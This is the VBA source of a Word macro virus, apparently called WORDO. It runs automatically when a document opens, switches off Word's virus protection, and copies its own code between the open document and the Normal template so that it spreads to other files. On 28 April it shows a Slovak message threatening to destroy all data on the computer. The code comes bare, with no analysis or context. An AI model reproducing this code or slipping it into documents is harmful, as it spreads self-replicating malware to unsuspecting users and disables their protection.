   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Open()
   Options.VirusProtection = False
   If InStr(Date, "28.4.") <> 0 Then
   MsgBox "Nazdar!" + Chr(10) + Chr(13) + _
   "Ja som virus WORDO a ked sa mi bude chciet" _
   + ", tak znicim vsetky data v tomto " _
   + "pocitaci.", vbOKOnly + vbExclamation, _
   "VIRUS"
   End If
   If NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines = 0 Then GoTo 1
   If ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines <> 0 Then Exit Sub
   pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
   z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
   ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString (z)
   ActiveDocument.Save
   Exit Sub
   1
   pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
   z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
   NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString (z)
   NormalTemplate.Save
   End Sub
